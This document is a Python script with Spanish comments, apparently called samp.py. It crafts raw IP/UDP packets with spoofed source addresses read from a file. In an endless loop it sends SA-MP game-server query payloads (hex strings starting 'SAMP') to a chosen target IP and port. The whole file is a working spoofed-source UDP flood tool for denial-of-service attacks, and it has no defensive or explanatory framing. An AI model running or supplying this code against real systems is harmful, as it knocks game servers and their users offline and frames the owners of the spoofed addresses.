import socket
import struct
import codecs
import sys

# Función para calcular el checksum
def checksum(msg):
    if len(msg) % 2 != 0:
        msg += b'\0'
    s = sum(msg[i] << 8 | msg[i + 1] for i in range(0, len(msg), 2))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# Construir el paquete IP
def build_ip_header(source_ip, dest_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0 
    ip_id = 54321  # ID fijo del paquete
    ip_frag_off = 0
    ip_ttl = 64  # TTL fijo
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0  
    ip_saddr = socket.inet_aton(source_ip) 
    ip_daddr = socket.inet_aton(dest_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    return struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

# Construir el paquete UDP
def build_udp_header(source_ip, dest_ip, source_port, dest_port, user_data):
    udp_len = 8 + len(user_data)
    pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(dest_ip), 0, socket.IPPROTO_UDP, udp_len)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_len, 0)
    checksum_value = checksum(pseudo_header + udp_header + user_data)
    return struct.pack('!HHHH', source_port, dest_port, udp_len, checksum_value)

# Verificar si se pasaron los argumentos necesarios
if len(sys.argv) != 4:
    print("Uso: python3 samp.py <IP_DESTINO> <PUERTO_DESTINO> <ARCHIVO_LISTA_IPS>")
    sys.exit(1)

# Obtener los argumentos de la línea de comandos
dest_ip = sys.argv[1]
dest_port = int(sys.argv[2])
source_file = sys.argv[3]

# IPs y puertos de origen (cargados de un archivo)
try:
    with open(source_file, "r") as file:
        source_list = [line.strip().replace(",", " ").split() for line in file]
except FileNotFoundError:
    print(f"El archivo '{source_file}' no se encontró.")
    sys.exit(1)

# Lista de payloads (paquetes) que se enviarán
paquetes = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),  
    codecs.decode("53414d509538e1a9611e69", "hex_codec"), 
    codecs.decode("53414d509538e1a9611e72", "hex_codec"), 
    codecs.decode("081e77da", "hex_codec")  
]
# Crear el socket RAW
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
try:
    while True:
        for source_ip, source_port in source_list:
            source_port = int(source_port)
            
            # Enviar paquetes sin variaciones
            for paquete in paquetes:
                # Construir cabeceras
                ip_header = build_ip_header(source_ip, dest_ip)
                udp_header = build_udp_header(source_ip, dest_ip, source_port, dest_port, paquete)
                
                # Paquete final
                packet = ip_header + udp_header + paquete
                
                # Enviar el paquete
                sock.sendto(packet, (dest_ip, dest_port))
                print(f"Paquete enviado desde IP {source_ip}, Puerto {source_port} a IP {dest_ip}, Puerto {dest_port} con payload: {paquete.hex()}")

except KeyboardInterrupt:
    print("\nScript detenido.")
finally:
    sock.close()
    print("Socket cerrado. Script terminado.")
